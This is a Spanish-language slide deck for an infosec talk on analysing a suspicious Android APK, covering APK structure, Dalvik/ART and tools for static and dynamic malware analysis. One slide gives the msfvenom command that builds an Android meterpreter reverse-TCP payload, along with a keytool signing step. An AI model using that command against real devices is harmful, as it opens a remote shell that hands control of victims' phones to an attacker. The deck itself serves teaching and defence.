---
title: 'Me compartieron un APK'
theme: night
highlightTheme: monokai
revealOptions:
    transition: 'slide'
---
## Analizando un apk sospechoso
#### Tony Palma
---


<!-- .slide: style="text-align: left;"> -->
### About Me

Me dedico a la consultoría de TI, casado, 31 años.

- Entusiasta de infosec
- CTF Player (Mayas)
- FLOSS
- HTB
- *Disfrutar una buena taza de café* **o una cerveza bien fria**.

---


<!-- .slide: style="text-align: left;"> -->
### Qué pasó la sesión pasada?

La sesión pasada Javier nos demostró que fácil es colocar un meterpreter en un APK y que con técnicas de ingeniería social, era capaz de tomar el control de nuestro móvil.

Hoy estaremos analizando una muestra de ese malware.

---


<!-- .slide: style="text-align: left;"> -->
### Generacion del APK Malicioso

```
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.99.1 LPORT=4001 -o miau.apk
keytool -genkey -v -keystore key.Keystore -alias miau -keyalg RSA -keysize 2048 -validity 10000
``` 
etc


---


<!-- .slide: style="text-align: left;"> -->
### Agenda

* Un poco de teoria sobre como funcionan las aplicaciones sobre android
* Como armar un laboratorio rápido
* Que tanto podemos encontrar en el apk infectado

---


<!-- .slide: style="text-align: left;"> -->
### Android Application Package

* Archivo comprimido (ZIP)
* Estructura definida de directorios y archivos
* Control de permisos y características de la aplicación por XML
* Archivos precompilados por arquitectura, recursos no compilados y recursos de aplicaciones
* Archivo DEX (Dalvik Executable Format)


---


### Android Application Package
![Diagrama de estructura de directorios y archivos](/img/content1.jpeg)

---


<!-- .slide: style="text-align: left;"> -->
### Dalvik Virtual Machine

* No usa Java bytecode
* Los archivos DEX corren sobre la DVM
* Podemos decompilar estos archivos class en una aproximación (smali) a Java Class

Desde Android 5.0, Dalvik ha sido remplazado por the Android Runtime (ART)

---


<!-- .slide: style="text-align: left;"> -->
### Analisis de Malware

* Análisis estático
  - JADX, JD, JEB
  - dextools (d2j)
* Análisis dinámico
  - Android-sdk
  - Emuladores
  - Sandbox local y remoto

---


### Reverse Engineering
![Reverse Engineering](/img/toolmap.png)

---


<!-- .slide: style="text-align: left;"> -->
## Otras herramientas importantes

* Frida
* MobSF
* ghidra
* cuckoo for Android
* [https://github.com/ashishb/android-security-awesome](https://github.com/ashishb/android-security-awesome)

---


<!-- .slide: style="text-align: left;"> -->
## Apliquemos conceptos
